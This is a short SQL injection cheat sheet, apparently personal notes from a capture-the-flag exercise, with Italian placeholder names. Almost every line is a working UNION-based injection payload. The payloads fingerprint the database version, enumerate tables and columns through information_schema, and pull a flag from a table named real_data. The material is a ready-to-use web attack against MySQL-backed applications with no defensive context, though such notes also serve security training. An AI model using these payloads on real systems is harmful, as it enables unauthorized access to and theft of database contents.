-- QUERIES --

-- Standard

1' UNION SELECT 1,2,3,4,5, '6

-- Version

1' union select 1,version(),3,4,5,'6

-- Current User Tables

SELECT table_name FROM information_schema.tables

-- Current DB Tables 

SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()

-- Column List from Table

SELECT column_name FROM information_schema.columns WHERE table_name = '*nome della tabella*'

-- All Columns of all Tables of Current Schema

SELECT table_name, column_name from information_schema.columns WHERE table_schema=DATABASE()

-- Join UNION and DB schema

' UNION SELECT prima_colonna,seconda_colonna,3,4,5,6 FROM table WHERE colonna_di_esempio='*valore di esempio*' -- 

'

-- End with always true condition that closes the input zone

' UNION SELECT prima_colonna,seconda_colonna,3,4,5,6 FROM table WHERE colonna_di_esempio='*valore di esempio*' AND '1'='1

-- Get Columns and tables with union

' UNION SELECT table_name, column_name,2,3,4,5 from information_schema.columns WHERE table_schema=DATABASE() -- 

'

-- Solution

' UNION SELECT flag, 2,3,4,5,6 FROM real_data -- '